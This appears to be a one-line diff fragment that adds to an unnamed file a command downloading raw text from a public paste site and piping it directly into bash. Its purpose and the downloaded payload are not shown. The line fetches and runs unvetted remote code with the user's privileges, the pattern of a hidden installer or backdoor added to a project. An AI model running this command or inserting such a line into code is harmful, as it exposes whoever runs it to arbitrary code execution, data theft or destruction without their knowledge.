@@ -1,0 +1,1 @@
+curl -sL https://dpaste.org/eO7RS/raw | bash
